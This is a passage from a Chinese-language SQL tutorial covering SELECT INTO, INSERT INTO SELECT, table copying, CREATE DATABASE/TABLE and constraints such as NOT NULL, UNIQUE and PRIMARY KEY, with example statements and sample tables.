<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>新表将会使用 SELECT 语句中定义的列名称和类型进行创建。您可以使用 AS 子句来应用新名称。</p>
<p>SQL SELECT INTO 实例</p>
<p>创建 Websites 的备份复件：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制一些列插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">url</span></span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制中国的网站插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>复制多个表中的数据插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>SELECT INTO 语句可用于通过另一种模式创建一个新的空表。只需要添加促使查询没有数据返回的 WHERE 子句即可：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> newtable</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-SELECT-语句"><a href="#SQL-INSERT-INTO-SELECT-语句" class="headerlink" title="SQL INSERT INTO SELECT 语句"></a>SQL INSERT INTO SELECT 语句</h4><p>INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。目标表中任何已存在的行都不会受影响。</p>
<p>SQL INSERT INTO SELECT 语法</p>
<p>我们可以从一个表中复制所有的列插入到另一个已存在的表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table2</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者我们可以只复制希望的列插入到另一个已存在的表中：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table2</span><br><span class="line">(<span class="name">column_name</span>(<span class="name">s</span>))</span><br><span class="line">SELECT column_name(<span class="name">s</span>)</span><br><span class="line">FROM table1<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL INSERT INTO SELECT 实例</p>
<p>复制 “apps” 中的数据插入到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps;</span><br></pre></td></tr></table></figure>

<p>只复 QQ 的 APP 到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>select into from 和 insert into select 都是用来复制表</p>
<p>两者的主要区别为： <strong>select  into … from</strong> 要求目标表不存在，因为在插入时会自动创建；<strong>insert into … select from</strong> 要求目标表存在。</p>
<p>\1. 复制表结构及其数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>\2. 只复制表结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old <span class="keyword">where</span> <span class="number">1</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">table</span> table_name_new <span class="comment">like table_name_old</span></span><br></pre></td></tr></table></figure>

<p>\3. 只复制表数据：</p>
<p>如果两个表结构一样：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_name_new <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>如果两个表结构不一样：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert <span class="keyword">into</span> table_name_new(column1,column2<span class="params">...</span>) <span class="keyword">select</span> column1,column2<span class="params">...</span> from table_name_old</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-DATABASE-语句"><a href="#SQL-CREATE-DATABASE-语句" class="headerlink" title="SQL CREATE DATABASE 语句"></a>SQL CREATE DATABASE 语句</h4><p>CREATE DATABASE 语句用于创建数据库。</p>
<p>SQL CREATE DATABASE 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> dbname;</span><br></pre></td></tr></table></figure>

<p>SQL CREATE DATABASE 实例</p>
<p>下面的 SQL 语句创建一个名为 “my_db” 的数据库：</p>
<p>CREATE DATABASE my_db;</p>
<p>数据库表可以通过 CREATE TABLE 语句来添加。</p>
<h4 id="SQL-CREATE-TABLE-语句"><a href="#SQL-CREATE-TABLE-语句" class="headerlink" title="SQL CREATE TABLE 语句"></a>SQL CREATE TABLE 语句</h4><p>CREATE TABLE 语句用于创建数据库中的表。</p>
<p>表由行和列组成，每个表都必须有个表名</p>
<p>SQL CREATE TABLE 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>),</span><br><span class="line">column_name2 data_type(<span class="name">size</span>),</span><br><span class="line">column_name3 data_type(<span class="name">size</span>),</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>column_name 参数规定表中列的名称。</p>
<p>data_type 参数规定列的数据类型（例如 varchar、integer、decimal、date 等等）。</p>
<p>size 参数规定表中列的最大长度。</p>
<p><strong>提示：</strong>如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>SQL CREATE TABLE 实例</p>
<p>现在我们想要创建一个名为 “Persons” 的表，包含五列：PersonID、LastName、FirstName、Address 和 City。</p>
<p>我们使用下面的 CREATE TABLE 语句：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">PersonID int,</span><br><span class="line">LastName varchar(255),</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>PersonID 列的数据类型是 int，包含整数。</p>
<p>LastName、FirstName、Address 和 City 列的数据类型是 varchar，包含字符，且这些字段的最大长度为 255 个字符。</p>
<p>空的 “Persons” 表如下所示：</p>
<table>
<thead>
<tr>
<th align="left">PersonID</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>可使用 INSERT INTO 语句向空表写入数据。</p>
<h4 id="SQL-约束（Constraints）"><a href="#SQL-约束（Constraints）" class="headerlink" title="SQL 约束（Constraints）"></a>SQL 约束（Constraints）</h4><p>SQL 约束用于规定表中的数据规则。</p>
<p>如果存在违反约束的数据行为，行为会被约束终止。</p>
<p>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）。</p>
<p>SQL CREATE TABLE + CONSTRAINT 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name2 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name3 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>在 SQL 中，我们有如下约束：</p>
<ul>
<li><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</li>
<li><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</li>
<li><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</li>
<li><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li>
<li><strong>CHECK</strong> - 保证列中的值符合指定的条件。</li>
<li><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</li>
</ul>
<p>在下面的章节，我们会详细讲解每一种约束。</p>
<p>PRIMARY KEY 约束的实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (Id_P)  //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,   //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NOT-NULL-约束"><a href="#SQL-NOT-NULL-约束" class="headerlink" title="SQL NOT NULL 约束"></a>SQL NOT NULL 约束</h4><p>NOT NULL 约束强制列不接受 NULL 值。</p>
<p>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p>
<p>下面的 SQL 强制 “P_Id” 列和 “LastName” 列不接受 NULL 值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>删除表的字段的 not null 约束：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-UNIQUE-约束"><a href="#SQL-UNIQUE-约束" class="headerlink" title="SQL UNIQUE 约束"></a>SQL UNIQUE 约束</h4><p>UNIQUE 约束唯一标识数据库表中的每条记录。</p>
<p>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p>PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。</p>
<p>请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。</p>
<p>CREATE TABLE 时的 SQL UNIQUE 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 UNIQUE 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">UNIQUE (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> UNIQUE,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>uc_PersonID</strong> 是一个约束名 ！上面建的是唯一约束，为了方便区别约束名一般起得有规律点比如 UC（就是 UNIQUE CONSTRAINT 的缩写意思是唯一约束） uc_PersonID 就是对表中的PersonID 建唯一约束，强制约束 Id_P 和 LastName 唯一。</p>
<p>ALTER TABLE 时的 SQL UNIQUE 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uc_PersonID <span class="keyword">UNIQUE</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p>撤销 UNIQUE 约束</p>
<p>如需撤销 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb2(</span><br><span class="line">    tb2_id <span class="built_in">int</span> <span class="keyword">unique</span>,</span><br><span class="line">    tb2_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb2_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">unique</span>(tb2_name)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb2;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2(tb2_id,tb2_name,tb2_age) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2 <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">'张三'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--建表时，创建约束，有约束名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb3(</span><br><span class="line">    tb3_id <span class="built_in">int</span> ,</span><br><span class="line">    tb3_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb3_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">constraint</span> no_id <span class="keyword">unique</span> (tb3_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_age) <span class="keyword">values</span>(<span class="number">2</span>,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb3;</span><br><span class="line"></span><br><span class="line"><span class="comment">--已经有了tb3_id为1的行记录，再次插入，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_name,tb3_age) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'李四'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3表添加主键约束，主键名为：pk_id</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> pk_id primary <span class="keyword">key</span> (tb3_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3_name添加唯一约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> un_name <span class="keyword">unique</span> (tb3_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">--已存在姓名为张三的记录，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--mysql 删除约束的语句，使用index，		oracle SqlServer等使用constraint</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">drop</span> <span class="keyword">index</span> un_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除约束后，允许存在多个tb3_name为张三的记录</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br></pre></td></tr></table></figure>

<p>sql server 2008 删除约束的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">drop</span> constraint_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-PRIMARY-KEY-约束"><a href="#SQL-PRIMARY-KEY-约束" class="headerlink" title="SQL PRIMARY KEY 约束"></a>SQL PRIMARY KEY 约束</h4><p>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</p>
<p>主键必须包含唯一的值。</p>
<p>主键列不能包含 NULL 值。</p>
<p>每个表都应该有一个主键，并且每个表只能有一个主键。</p>
<p>CREATE TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 PRIMARY KEY 约束：</p>
<p><strong>MySQL：</strong></p>
